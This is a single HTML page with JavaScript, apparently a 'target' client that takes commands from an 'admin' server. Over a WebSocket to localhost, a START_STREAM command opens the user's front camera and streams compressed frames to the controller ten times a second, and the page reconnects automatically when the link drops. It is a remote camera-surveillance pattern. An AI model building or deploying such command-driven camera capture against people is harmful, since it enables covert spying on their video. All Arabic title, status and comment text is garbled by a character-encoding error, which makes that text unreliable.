<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Ø§Ù„Ø¹Ù…ÙŠÙ„/Ø§Ù„Ù‡Ø¯Ù (Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø£ÙˆØ§Ù…Ø±)</title>
    <style>
        body { font-family: Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #ffe0e0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); border: 2px solid #f44336; }
        h2 { color: #f44336; }
        video { width: 100%; max-height: 400px; border: 3px solid #f44336; border-radius: 8px; margin-top: 15px; background-color: #000; }
        #status { margin-top: 10px; font-weight: bold; color: #333; }
    </style>
</head>
<body>

<div class="container">
    <h2>ğŸ¯ ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¹Ù…ÙŠÙ„/Ø§Ù„Ù‡Ø¯Ù</h2>
    <div id="status">Ø¬Ø§Ø±ÙŠ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø®Ø§Ø¯Ù… Ø§Ù„Ø£Ø¯Ù…Ù†...</div>
    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement" style="display:none;"></canvas>
</div>

<script>
    // **Ø§Ù„Ø¬Ø²Ø¡ 1: Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø§ØªØµØ§Ù„ ÙˆÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§**
    const videoElement = document.getElementById('videoElement');
    const canvasElement = document.getElementById('canvasElement');
    const ctx = canvasElement.getContext('2d');
    const statusDiv = document.getElementById('status');
    let socket;
    let stream;
    let intervalId;

    // Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø®Ø§Ø¯Ù… WebSockets (ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø§Ù„Ø£Ø¯Ù…Ù† ÙŠØ¹Ù…Ù„ ÙƒØ®Ø§Ø¯Ù… WebSockets Ø¹Ù„Ù‰ Ù†ÙØ³ Ø§Ù„Ù…Ù†ÙØ°)
    // Ù†Ø³ØªØ®Ø¯Ù… Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù…Ø¶ÙŠÙ Ø§Ù„Ù…Ø­Ù„ÙŠ (localhost) ÙˆØ§Ù„Ù…Ù†ÙØ° 8080 Ù„Ù„ØªØ¬Ø±Ø¨Ø©
    function connectToAdmin() {
        statusDiv.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø®Ø§Ø¯Ù… Ø§Ù„Ø£Ø¯Ù…Ù†...';
        socket = new WebSocket('ws://localhost:8080');

        socket.onopen = () => {
            statusDiv.textContent = 'âœ… ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø£Ø¯Ù…Ù†. Ø¬Ø§Ù‡Ø² Ù„Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø£ÙˆØ§Ù…Ø±.';
        };

        socket.onmessage = (event) => {
            const command = event.data;
            if (command === 'START_STREAM') {
                startCameraAndStreaming();
            } else if (command === 'STOP_STREAM') {
                stopStreaming();
            }
        };

        socket.onclose = () => {
            statusDiv.textContent = 'âŒ ØªÙ… Ù‚Ø·Ø¹ Ø§Ù„Ø§ØªØµØ§Ù„. Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†ÙŠ...';
            stopStreaming();
            setTimeout(connectToAdmin, 5000);
        };

        socket.onerror = (error) => {
            console.error('WebSocket Error:', error);
            statusDiv.textContent = 'âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„. ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„Ø£Ø¯Ù…Ù† ÙŠØ¹Ù…Ù„ ÙƒØ®Ø§Ø¯Ù….';
        };
    }

    // **Ø§Ù„Ø¬Ø²Ø¡ 2: Ø¨Ø¯Ø¡ Ø¨Ø« Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§**
    async function startCameraAndStreaming() {
        if (intervalId) return; // Ù„Ø§ ØªØ¨Ø¯Ø£ Ø¥Ø°Ø§ ÙƒØ§Ù†Øª ØªØ¹Ù…Ù„ Ø¨Ø§Ù„ÙØ¹Ù„

        try {
            // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ù„Ù„Ù…Ø­Ø§ÙƒØ§Ø©)
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            videoElement.srcObject = stream;
            statusDiv.textContent = 'ğŸ“· Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…ÙØªÙˆØ­Ø©. Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨Ø«.';

            // Ø¨Ø¯Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø·Ø§Ø±Ø§Øª ÙƒÙ„ 100 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© (10 Ø¥Ø·Ø§Ø±Ø§Øª/Ø«Ø§Ù†ÙŠØ©)
            intervalId = setInterval(sendFrame, 100);

        } catch (err) {
            console.error("Ø®Ø·Ø£ ÙÙŠ ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§: ", err);
            statusDiv.textContent = `ğŸš« ÙØ´Ù„ ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§: ${err.name}`;
            if (socket && socket.readyState === WebSocket.OPEN) {
                socket.send('ERROR: Camera access denied');
            }
        }
    }

    // **Ø§Ù„Ø¬Ø²Ø¡ 3: ÙˆØ¸ÙŠÙØ© Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø·Ø§Ø± ÙˆØ§Ø­Ø¯**
    function sendFrame() {
        if (!socket || socket.readyState !== WebSocket.OPEN) {
            clearInterval(intervalId);
            intervalId = null;
            return;
        }

        // 1. Ù†Ø³Ø® Ø§Ù„Ø¥Ø·Ø§Ø± Ù…Ù† Ø¹Ù†ØµØ± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ Ø¹Ù†ØµØ± Canvas
        const { videoWidth, videoHeight } = videoElement;
        canvasElement.width = videoWidth;
        canvasElement.height = videoHeight;
        ctx.drawImage(videoElement, 0, 0, videoWidth, videoHeight);

        // 2. ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¥Ø·Ø§Ø± Ø¥Ù„Ù‰ Ø¨ÙŠØ§Ù†Ø§Øª (Base64)
        const imageData = canvasElement.toDataURL('image/jpeg', 0.5); // Ø¶ØºØ· Ø§Ù„ØµÙˆØ±Ø© Ù„ØªÙ‚Ù„ÙŠÙ„ Ø§Ù„Ø­Ø¬Ù…

        // 3. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        socket.send(imageData);
    }

    // **Ø§Ù„Ø¬Ø²Ø¡ 4: Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨Ø« ÙˆØ§Ù„ÙƒØ§Ù…ÙŠØ±Ø§**
    function stopStreaming() {
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
            statusDiv.textContent = 'ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¨Ø« Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø£Ù…Ø± Ø§Ù„Ø£Ø¯Ù…Ù†.';
        }
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
            videoElement.srcObject = null;
        }
    }

    // Ø§Ù„Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø§ØªØµØ§Ù„
    connectToAdmin();
</script>

</body>
</html>
